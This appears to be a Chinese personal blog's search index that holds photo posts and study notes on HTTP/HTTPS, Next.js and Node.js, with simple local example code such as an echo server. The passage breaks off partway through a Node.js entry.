<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>摄影日常</title>
    <link href="/2023/04/04/Sakura/"/>
    <url>/2023/04/04/Sakura/</url>
    
    <content type="html"><![CDATA[<h1 id="鼋头渚"><a href="#鼋头渚" class="headerlink" title="鼋头渚"></a>鼋头渚</h1><ul><li><h2 id="风铃"><a href="#风铃" class="headerlink" title="风铃"></a>风铃</h2></li></ul><p><img src="https://s3.bmp.ovh/imgs/2023/04/04/72eecb13a3eeb7ce.jpg"></p><ul><li><h3 id="赏樱楼"><a href="#赏樱楼" class="headerlink" title="赏樱楼"></a>赏樱楼</h3></li></ul><p><img src="https://s3.bmp.ovh/imgs/2023/04/04/585ac0cd9a73194b.jpg"></p><p><img src="https://s3.bmp.ovh/imgs/2023/04/04/cb194db6f07ecf6b.jpg"></p><p><img src="https://s3.bmp.ovh/imgs/2023/04/04/2d421f9746a830c4.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>日常</category>
      
    </categories>
    
    
    <tags>
      
      <tag>摄影</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>摄影日常</title>
    <link href="/2023/03/27/%E6%91%84%E5%BD%B1%E6%97%A5%E5%B8%B8/"/>
    <url>/2023/03/27/%E6%91%84%E5%BD%B1%E6%97%A5%E5%B8%B8/</url>
    
    <content type="html"><![CDATA[<h1 id="摄影日常"><a href="#摄影日常" class="headerlink" title="摄影日常"></a>摄影日常</h1><h2 id="LCY"><a href="#LCY" class="headerlink" title="LCY"></a>LCY</h2><p><img src="https://s3.bmp.ovh/imgs/2023/03/27/eabacabc142c6049.jpg"></p><h2 id="Burger-King"><a href="#Burger-King" class="headerlink" title="Burger King"></a>Burger King</h2><p><img src="https://s3.bmp.ovh/imgs/2023/03/27/61840edf2a17bb69.jpg"></p><h2 id="Sakura"><a href="#Sakura" class="headerlink" title="Sakura"></a>Sakura</h2><p><img src="https://s3.bmp.ovh/imgs/2023/03/27/68e8d8970d3f602b.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>日常</category>
      
    </categories>
    
    
    <tags>
      
      <tag>摄影</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTTPS实用指南</title>
    <link href="/2023/03/27/HTTP/"/>
    <url>/2023/03/27/HTTP/</url>
    
    <content type="html"><![CDATA[<h1 id="HTTPS实用指南"><a href="#HTTPS实用指南" class="headerlink" title="HTTPS实用指南"></a>HTTPS实用指南</h1><h2 id="一、初识"><a href="#一、初识" class="headerlink" title="一、初识"></a>一、初识</h2><h3 id="1-背景知识"><a href="#1-背景知识" class="headerlink" title="1.背景知识"></a>1.背景知识</h3><p>输入网址获得网页的过程？</p><p><img src="https://s3.bmp.ovh/imgs/2023/02/03/f6ce5b862569e192.jpg"></p><h5 id="HTTP发展"><a href="#HTTP发展" class="headerlink" title="HTTP发展"></a>HTTP发展</h5><p><img src="https://s3.bmp.ovh/imgs/2023/02/03/bd303c5375ece729.jpg"></p><h3 id="2-报文内容"><a href="#2-报文内容" class="headerlink" title="2.报文内容"></a>2.报文内容</h3><p><img src="https://s3.bmp.ovh/imgs/2023/02/03/eb7f13f8f1a5596c.jpg"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">常用请求头<br></code></pre></td></tr></table></figure><p><img src="https://s3.bmp.ovh/imgs/2023/02/03/1848c837bc2cf08d.jpg"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">常用响应头<br></code></pre></td></tr></table></figure><p><img src="https://s3.bmp.ovh/imgs/2023/02/03/08fd49af7f73a5af.jpg"></p><h3 id="3-Methods"><a href="#3-Methods" class="headerlink" title="3. Methods"></a>3. Methods</h3><p><img src="https://s3.bmp.ovh/imgs/2023/02/03/83884b861c15d41f.jpg"></p><ul><li>安全的（不会修改服务器数据）：GET HEAD OPTIONS</li><li>幂等（同样的请求执行一次和多次的效果是一致的）：所有安全的方法都是幂等的+PUT DELETE；</li></ul><h3 id="4-状态码"><a href="#4-状态码" class="headerlink" title="4.状态码"></a>4.状态码</h3><p><img src="https://s3.bmp.ovh/imgs/2023/02/03/86f6032a7181310d.jpg"></p><h3 id="5-Restful-API"><a href="#5-Restful-API" class="headerlink" title="5. Restful API"></a>5. Restful API</h3><ul><li>每一种URL代表一种资源；</li><li>客户端和服务器之间，传递这种资源的某种表现层；</li><li>客户端通过HTTP Methods,对服务端资源进行操作，实现“表现层状态转化”；</li></ul><p><img src="https://s3.bmp.ovh/imgs/2023/02/03/377079155bbec1bc.jpg"></p><h3 id="6-缓存"><a href="#6-缓存" class="headerlink" title="6.缓存"></a>6.缓存</h3><p><img src="https://s3.bmp.ovh/imgs/2023/02/03/65a645bc76884d65.jpg"></p><ul><li>强缓存资源本地有就直接用本地资源</li><li>协商缓存即使本地有缓存，但是还是需要和server端进行通信确认是否最新等；</li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">缓存流程示意<br></code></pre></td></tr></table></figure><p><img src="https://s3.bmp.ovh/imgs/2023/02/03/1bd6b0f0379d4254.jpg"></p><h3 id="7-Cookie"><a href="#7-Cookie" class="headerlink" title="7. Cookie"></a>7. Cookie</h3><p><img src="https://s3.bmp.ovh/imgs/2023/02/03/f2c87718dc00674c.jpg"></p><h3 id="8-HTTP-2"><a href="#8-HTTP-2" class="headerlink" title="8. HTTP/2"></a>8. HTTP/2</h3><blockquote><p>更快、更稳定、更简单</p></blockquote><ul><li>使用帧作为通信的最小单位，每个帧都包含头，至少回标识出当前帧所属的数据流；</li><li>采用二进制编码，效率更高，有更好的压缩算法；</li><li>消息：与逻辑请求或者响应消息对应的完整的一系列帧；</li><li>数据流：已建立的连接内双向字节流，可以承载一条或多条消息；</li><li>交错发送，接收方重组织；</li><li>链接都是永久的，而且仅需要每个来源一个连接；</li><li>流控制：阻止发送方向接收方发送大量数据的机制（似乎可以防范DDOS？）</li></ul><p><img src="https://s3.bmp.ovh/imgs/2023/02/03/e85b4b47fe56a57a.jpg"></p><h3 id="9-HTTPS"><a href="#9-HTTPS" class="headerlink" title="9.  HTTPS"></a>9.  HTTPS</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">经过TSL/SSL加密<br></code></pre></td></tr></table></figure><p><img src="https://s3.bmp.ovh/imgs/2023/02/03/d6e3190e2ebe64b2.jpg"></p><h2 id="二、HTTP协议的应用场景分析"><a href="#二、HTTP协议的应用场景分析" class="headerlink" title="二、HTTP协议的应用场景分析"></a>二、HTTP协议的应用场景分析</h2><h3 id="1-静态资源"><a href="#1-静态资源" class="headerlink" title="1.静态资源"></a>1.静态资源</h3><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">方案：缓存+CDN+文件名<span class="hljs-built_in">Hash</span><br></code></pre></td></tr></table></figure><ul><li>CDN (Content Delivery Network) :通过用户就近性和服务器负载进行判断，提供快速服务；CDN复杂解决文件加载快慢；</li><li>文件名Hash来保证每次刷新获得的资源是最新的；</li></ul><h3 id="2-登录"><a href="#2-登录" class="headerlink" title="2.登录"></a>2.登录</h3><p>头条页面密码登录会发出两个请求；</p><ul><li>请求1的Methods是OPTIONS：跨域、cross-origin</li></ul><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs delphi">一个url由scheme+host <span class="hljs-keyword">name</span>+port组成<br>e.g. https:<span class="hljs-comment">//www.example.com:443</span><br>跨域：scheme、host <span class="hljs-keyword">name</span>、prot任意一个有区别都认为是跨域；<br>Note：如果https没有写明<span class="hljs-number">443</span>端口号也可以认为是同域；http默认<span class="hljs-number">80</span>；port可以不写；<br></code></pre></td></tr></table></figure><ul><li>跨域</li></ul><p><img src="https://pic.imgdb.cn/item/63dc762107d5ca72062d5196.jpg"></p><h5 id="跨域解决方案："><a href="#跨域解决方案：" class="headerlink" title="跨域解决方案："></a>跨域解决方案：</h5><ul><li>CORS</li><li>代理服务器：同源策略是浏览器的安全策略，不是http的</li></ul><p><img src="https://s3.bmp.ovh/imgs/2023/02/03/2ed3f548ffca14ab.jpg"></p><ul><li>IFrame：存在诸多不便；</li></ul><p><img src="https://pic.imgdb.cn/item/63dc76b007d5ca72062e430c.jpg"></p><h5 id="鉴权"><a href="#鉴权" class="headerlink" title="鉴权"></a>鉴权</h5><ul><li>session+cookie</li><li>JWT（JSON web token）token具有唯一性；</li></ul><p><img src="https://pic.imgdb.cn/item/63dc76fe07d5ca72062e9fdb.jpg"></p><ul><li>SSO（Single Sign On）：单点登录</li></ul><p>重定向到子站就进行登录态查询，登陆在线则可以继续访问；不在线跳转到SSO登录后继续访问；</p><h2 id="三、实战"><a href="#三、实战" class="headerlink" title="三、实战"></a>三、实战</h2><h3 id="1-Ajax之XHR"><a href="#1-Ajax之XHR" class="headerlink" title="1. Ajax之XHR"></a>1. Ajax之XHR</h3><h3 id="2-常用请求库Axios（参考官网）"><a href="#2-常用请求库Axios（参考官网）" class="headerlink" title="2.常用请求库Axios（参考官网）"></a>2.常用请求库Axios（参考官网）</h3><h3 id="3-网络优化（需要补充）"><a href="#3-网络优化（需要补充）" class="headerlink" title="3.网络优化（需要补充）"></a>3.网络优化（需要补充）</h3><p><img src="https://pic.imgdb.cn/item/63dc79d407d5ca7206341e84.jpg"></p><h3 id="4-稳定性"><a href="#4-稳定性" class="headerlink" title="4.稳定性"></a>4.稳定性</h3><ul><li>重试是保证稳定性的有效手段，但是要防止滥用，导致server情况更加恶劣；</li><li>缓存合理使用，作为最后一道防线；</li></ul><p><img src="https://pic.imgdb.cn/item/63dc7a1507d5ca7206351481.jpg"></p><h2 id="四、拓展"><a href="#四、拓展" class="headerlink" title="四、拓展"></a>四、拓展</h2><h3 id="1-Websocket"><a href="#1-Websocket" class="headerlink" title="1.Websocket"></a>1.Websocket</h3><ul><li>进行全双工的通讯；</li><li>实时性要求较高，例如聊天室；（开启聊天室demo）</li><li>url使用ws:// 或者 wss：//</li></ul><h3 id="2-QUIC（Quick-UDP-Internet-Connection）"><a href="#2-QUIC（Quick-UDP-Internet-Connection）" class="headerlink" title="2.QUIC（Quick UDP Internet Connection）"></a>2.QUIC（Quick UDP Internet Connection）</h3><ul><li>相比于TCP更快；</li><li>可靠性类似于TCP；</li><li>支持h2的多路复用，没有TCP的HOL文通；</li><li>前向纠错FEC</li><li>用户空间的阻塞算法，最新的BBR算法；</li></ul>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>笔记</tag>
      
      <tag>计算机网络</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Next</title>
    <link href="/2023/03/27/NextJS/"/>
    <url>/2023/03/27/NextJS/</url>
    
    <content type="html"><![CDATA[<h1 id="Next"><a href="#Next" class="headerlink" title="Next"></a>Next</h1><h2 id="一、CSR、SSR、SGR"><a href="#一、CSR、SSR、SGR" class="headerlink" title="一、CSR、SSR、SGR"></a>一、CSR、SSR、SGR</h2><h3 id="1-基础概念"><a href="#1-基础概念" class="headerlink" title="1.基础概念"></a>1.基础概念</h3><ul><li>B端指内部使用的管理平台</li><li>C端面向公网外部用户</li></ul><h3 id="2-CSR客户端渲染"><a href="#2-CSR客户端渲染" class="headerlink" title="2.CSR客户端渲染"></a>2.CSR客户端渲染</h3><ul><li>常见的B端Web开发模式，前后端分离，服务器压力相对较轻；渲染在客户端进行，服务器直接返回不加工的HTML用户再后续访问操作；</li><li>SPA：所需的资源在一起请求中就加载完成，不需要动态加载，首屏时间更长；</li></ul><h3 id="3-SSR服务端渲染"><a href="#3-SSR服务端渲染" class="headerlink" title="3.SSR服务端渲染"></a>3.SSR服务端渲染</h3><ul><li>从原先的JSP/PHP就已经体现了服务端渲染；代码耦合度高，且模板语言混杂编程语言，对于一些复杂的功能，维护较为痛苦；这种模式下JAVA，PHP复杂渲染的逻辑，而前端只负责UI和交互；</li></ul><h3 id="4-同构SSR"><a href="#4-同构SSR" class="headerlink" title="4.同构SSR"></a>4.同构SSR</h3><ul><li>BFF：backend For Frontend 服务于前端应用的后端</li><li>前后端一体化，一套React代码在服务器上运行一遍，到达浏览器又运行一遍；</li><li>前后端都需要参与渲染，而且首次渲染出的HTMl要一样；</li></ul><p><img src="https://s3.bmp.ovh/imgs/2023/02/01/b73d6eab9d1b5bc2.jpg"></p><h3 id="5-SSG静态站点生成"><a href="#5-SSG静态站点生成" class="headerlink" title="5.SSG静态站点生成"></a>5.SSG静态站点生成</h3><ul><li>在构建的时候直接把结果网页输出到磁盘，每次访问直接把HTML返回给客户端，相当于一个静态资源；</li><li>CDN：建立并覆盖在Internet尚，由分布在不同区域的边缘节点服务器组成的分布式网络；</li><li>相较于SSR，因为不需要每次请求都有服务器处理，所以可以大幅减轻服务器端的压力；</li><li>缺陷在于无法生成与用户有关的内容，也就是所有的用户访问的页面是相同的（作为展示）；</li></ul><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">SSR、SSG的优势：<br>因为不需要请求大量的<span class="hljs-keyword">JS</span>文件，这就使得SSR/SSG可以拥有更短的首屏时间；<br></code></pre></td></tr></table></figure><p><img src="https://s3.bmp.ovh/imgs/2023/02/01/b9d61a89d2aef5dd.jpg"></p><h2 id="二、NextJS"><a href="#二、NextJS" class="headerlink" title="二、NextJS"></a>二、NextJS</h2><h3 id="1-React的SSR"><a href="#1-React的SSR" class="headerlink" title="1.React的SSR"></a>1.React的SSR</h3><p>基于React提供的相关服务端渲染API实现，过程比较繁琐重复，因此迫切需要一个封装好的服务端渲染；</p><p><img src="https://s3.bmp.ovh/imgs/2023/02/01/d6148345e5c705e2.jpg"></p><h3 id="2-NextJS"><a href="#2-NextJS" class="headerlink" title="2.NextJS"></a>2.NextJS</h3><ul><li>构建与NodeJS尚的开源Web框架，支持基于React的Web应用程序功能，例如服务端渲染和生成静态网站；</li></ul><h3 id="3-使用"><a href="#3-使用" class="headerlink" title="3.使用"></a>3.使用</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">npx create-next-app@latest --typescript<br></code></pre></td></tr></table></figure><p>后面的看不懂，建议先看Next官网了解；</p>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>笔记</tag>
      
      <tag>Nuxt</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NoDe JS 实战</title>
    <link href="/2023/03/27/NodeJS%E5%AE%9E%E6%88%98%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    <url>/2023/03/27/NodeJS%E5%AE%9E%E6%88%98%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="NoDe-JS-实战"><a href="#NoDe-JS-实战" class="headerlink" title="NoDe JS 实战"></a>NoDe JS 实战</h1><h2 id="一、Welcome-to-node"><a href="#一、Welcome-to-node" class="headerlink" title="一、Welcome to node"></a>一、Welcome to node</h2><h3 id="1-NodeJS基础"><a href="#1-NodeJS基础" class="headerlink" title="1.NodeJS基础"></a>1.NodeJS基础</h3><ul><li>显著特征：异步、事件驱动机制</li><li>Node和JS的优势之一是单线程编程。为了实现同步，引入事件机制，点击按钮，触发事件，规避资源死锁和竞态条件</li><li>非阻塞I/O</li></ul><blockquote><p>程序可以在做其他事情的时候发起一个请求来获取网络资源，然后网络操作完成之后，运行一个回调函数来处理操作的结果</p></blockquote><ul><li>Node与V8</li></ul><blockquote><p>Node的动力源自V8引擎。V8的特性之一是会将JS代码直接编译为机器码。</p></blockquote><ul><li><p>特性组</p><blockquote><p>Node包含了v8提供的ES6特性，分为shipping、staged、in progress三组；</p><p>其中shipping是默认开启的，staged和in progress需要命令行参数开启</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">node --harmony<br>node --v8-options | grep &quot;in progress&quot;<br></code></pre></td></tr></table></figure></li><li><p>npm</p><blockquote><p> npm要求Node项目目录下有一个package.json文件；</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">npm init -y    //初始化package.json<br></code></pre></td></tr></table></figure></li><li><p>核心模块</p></li></ul><blockquote><p>fs，path，net，http/s，dns，assert，os</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs js"><br><span class="hljs-comment">//调取文件流</span><br><span class="hljs-keyword">const</span> fs=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><span class="hljs-keyword">const</span> zlib=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;zlib&#x27;</span>);<br><span class="hljs-keyword">const</span> gzip=zlib.<span class="hljs-title function_">createGzip</span>();<br><span class="hljs-keyword">const</span> outStream=fs.<span class="hljs-title function_">createWriteStream</span>(<span class="hljs-string">&#x27;output.js.gz&#x27;</span>);<br><br>fs.<span class="hljs-title function_">createReadStream</span>(<span class="hljs-string">&#x27;./fs.js&#x27;</span>).<span class="hljs-title function_">pipe</span>(gzip).<span class="hljs-title function_">pipe</span>(outStream);<br></code></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//网络模块</span><br><span class="hljs-keyword">const</span> http=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<br><span class="hljs-keyword">const</span> port=<span class="hljs-number">8080</span>;<br><br><span class="hljs-keyword">const</span> server=http.<span class="hljs-title function_">createServer</span>(<span class="hljs-function">(<span class="hljs-params">req,res</span>)=&gt;</span>&#123;<br>    res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;HEllo,node js!&quot;</span>);<br>&#125;);<br><br>server.<span class="hljs-title function_">listen</span>(port,<span class="hljs-function">()=&gt;</span>&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Server listening on:http://localhost:%s&quot;</span>,port);<br>&#125;);<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">//调试器<br>node debug server.js<br></code></pre></td></tr></table></figure><ul><li>主流Node程序：Web、命令行工具、桌面程序 </li></ul><blockquote><p>Node可以将TS转换为JS；</p></blockquote><h2 id="二、Node编程基础"><a href="#二、Node编程基础" class="headerlink" title="二、Node编程基础"></a>二、Node编程基础</h2><ul><li>如何组织代码？</li><li>如何实现异步编程？</li></ul><h3 id="1-Node功能的组织及重用"><a href="#1-Node功能的组织及重用" class="headerlink" title="1.Node功能的组织及重用"></a>1.Node功能的组织及重用</h3><p><img src="https://s3.bmp.ovh/imgs/2023/02/05/b3bf8ebded4c5d97.jpg"></p><blockquote><p>上面的做法会出现一个问题，就是两个文件声明了相同的变量名，导致重复声明；</p><p>PHP和Ruby等语言使用命名空间来解决问题；</p><p>Node选择不给程序员污染全局命名空间的机会；</p><p>Node模块允许从被引入文件中选择要暴露给程序的函数和变量，如果模块返回的函数或者变量不止一个，那么可以通过设定exports对象的属性来指明他们。</p></blockquote><p><img src="https://s3.bmp.ovh/imgs/2023/02/05/40f820b01ac722a9.jpg"></p><h3 id="2-创建一个Node项目"><a href="#2-创建一个Node项目" class="headerlink" title="2.创建一个Node项目"></a>2.创建一个Node项目</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkdir myApp<br>cd myApp<br>npm init -y   //全部使用默认值的package<br></code></pre></td></tr></table></figure><blockquote><p>require是Node中少数几个同步I/O操作之一；</p><p>I/O密集的地方尽量不要使用require，所有的同步调用都会阻塞Node；</p></blockquote><h3 id="3-node-modules重用模块"><a href="#3-node-modules重用模块" class="headerlink" title="3. node_modules重用模块"></a>3. node_modules重用模块</h3><blockquote><p>要求模块在文件系统中使用相对路径存放，对于组织程序特定的代码很有帮助。但是对于想要在程序见共享或者跟他人共享代码却用处不大。</p><p>Node有一个独特的模块引入机制，即node_modules,其模块检索规则如下：</p></blockquote><p><img src="https://s3.bmp.ovh/imgs/2023/02/07/4accd465166d6500.jpg"></p><h5 id="注意事项："><a href="#注意事项：" class="headerlink" title="注意事项："></a>注意事项：</h5><ul><li>如果模块是目录，在模块目录中定义模块的文件必须命名为index.js。除非在这个目录下一个叫package.json的文件特别执行。要执行一个取代index.js的文件，必须使用JSON数据定义的对象；</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;main&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;currency.js&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://s3.bmp.ovh/imgs/2023/02/07/eb62dc14f1e8a0e5.jpg"></p><ul><li>Node能把模块作为对象缓存起来。如果两个文件引入了相同的模块，第一个require会把模块返回的数据存到内存中。第二个引入会从内存中加载。</li></ul><p><img src="https://s3.bmp.ovh/imgs/2023/02/07/3baf64653ff8e710.jpg"></p><h5 id="！！！！！！不能实现"><a href="#！！！！！！不能实现" class="headerlink" title="！！！！！！不能实现"></a>！！！！！！不能实现</h5><h3 id="4-异步编程"><a href="#4-异步编程" class="headerlink" title="4.异步编程"></a>4.异步编程</h3><p>Node世界的两种响应逻辑方式：</p><ul><li>回调：通常用来定义一次性响应的逻辑。比如数据库查询；</li><li>事件监听：本质上也是一个回调，不同的是和一个概念实体有关（事件）；</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//下面的例子中，用EventEmitter.Prototype.on方法在服务器上绑定了一个监听器，当有request事件发出，服务器调用handleRequest函数</span><br><br>server.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;request&#x27;</span>,handleRequest);<br></code></pre></td></tr></table></figure><p>Node Http服务器实例是一个事件发射器，一个可以类（Event Emitter）；</p><p>Node的很多核心功能都继承自EventEmitter；</p><h5 id="用回调处理一次性事件"><a href="#用回调处理一次性事件" class="headerlink" title="用回调处理一次性事件"></a>用回调处理一次性事件</h5><blockquote><p>回调是一个函数，被当作参数传递给异步函数，用来描述异步操作完成之后要做什么。</p></blockquote><p>实例如下：</p><ul><li>异步获取存放在json文件中的文章标题</li><li>异步获取简单的HTML模板</li><li>将标题组装到HTML页面里</li><li>将HTML发送给客户</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> http=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<br><span class="hljs-keyword">const</span> fs=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><br>http.<span class="hljs-title function_">createServer</span>(<span class="hljs-function">(<span class="hljs-params">req,res</span>)=&gt;</span>&#123;<br>    <span class="hljs-title function_">getTitles</span>(res);<br>&#125;).<span class="hljs-title function_">listen</span>(<span class="hljs-number">8000</span>,<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>);<br><br><span class="hljs-comment">//将回调嵌套的功能代码提取出来</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">getTitles</span>(<span class="hljs-params">res</span>)&#123;<br>    fs.<span class="hljs-title function_">readFile</span>(<span class="hljs-string">&#x27;./data/title.json&#x27;</span>,<span class="hljs-function">(<span class="hljs-params">err,data</span>)=&gt;</span>&#123;<br>        <span class="hljs-keyword">if</span>(err) <span class="hljs-keyword">return</span> <span class="hljs-title function_">hadError</span>(err,res);<br>        <span class="hljs-title function_">getTemplate</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(data.<span class="hljs-title function_">toString</span>()),res);<br>    &#125;);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">getTemplate</span>(<span class="hljs-params">titles,res</span>)&#123;<br>    fs.<span class="hljs-title function_">readFile</span>(<span class="hljs-string">&#x27;./index.html&#x27;</span>,<span class="hljs-function">(<span class="hljs-params">err,data</span>)=&gt;</span>&#123;<br>        <span class="hljs-keyword">if</span>(err) <span class="hljs-keyword">return</span> <span class="hljs-title function_">hadError</span>(err,res);<br>        <span class="hljs-title function_">formatHtml</span>(titles,data.<span class="hljs-title function_">toString</span>(),res);<br>    &#125;)<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">formatHtml</span>(<span class="hljs-params">titles,templ,res</span>)&#123;<br>    <span class="hljs-keyword">const</span> html=templ.<span class="hljs-title function_">replace</span>(<span class="hljs-string">&#x27;%&#x27;</span>,titles.<span class="hljs-title function_">join</span>(<span class="hljs-string">&#x27;&lt;/li&gt;&lt;li&gt;&#x27;</span>));<br>    res.<span class="hljs-title function_">writeHead</span>(<span class="hljs-number">200</span>,&#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>:<span class="hljs-string">&#x27;text/html&#x27;</span>&#125;);<br>    res.<span class="hljs-title function_">end</span>(html);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">hadError</span>(<span class="hljs-params">err,res</span>)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(err);<br>    res.<span class="hljs-title function_">end</span>(<span class="hljs-string">&quot;Server Error&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="用事件发射器处理重复性事件"><a href="#用事件发射器处理重复性事件" class="headerlink" title="用事件发射器处理重复性事件"></a>用事件发射器处理重复性事件</h5><blockquote><p>事件发射器会触发事件，并且在那些事件被触发时能处理他们；</p><p>重要的Node API组件，比如HTTP服务器、TCP服务器和流都被做成了事件发射器；</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">socket.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;data&#x27;</span>,handleData)<br></code></pre></td></tr></table></figure><p>echo服务器的例子：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> net=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;net&#x27;</span>);<br><span class="hljs-keyword">const</span> server=net.<span class="hljs-title function_">createServer</span>(<span class="hljs-function"><span class="hljs-params">socket</span>=&gt;</span>&#123;<br>    socket.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;data&#x27;</span>,<span class="hljs-function"><span class="hljs-params">data</span>=&gt;</span>&#123;<br>        socket.<span class="hljs-title function_">write</span>(<span class="hljs-string">&quot;Your message is: &quot;</span>+data+<span class="hljs-string">&quot;.\n&quot;</span>);<br>    &#125;);<br>    <span class="hljs-comment">//只响应一次</span><br>    socket.<span class="hljs-title function_">once</span>(<span class="hljs-string">&#x27;data&#x27;</span>,<span class="hljs-function"><span class="hljs-params">data</span>=&gt;</span>&#123;<br>        socket.<span class="hljs-title function_">write</span>(<span class="hljs-string">&quot;Your message is: &quot;</span>+data+<span class="hljs-string">&quot;.\n&quot;</span>);<br>    &#125;);<br>&#125;);<br><br>server.<span class="hljs-title function_">listen</span>(<span class="hljs-number">8000</span>,<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>);<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">telnet 127.0.0.1 8888<br></code></pre></td></tr></table></figure><h5 id="一个PUB-SUB的例子"><a href="#一个PUB-SUB的例子" class="headerlink" 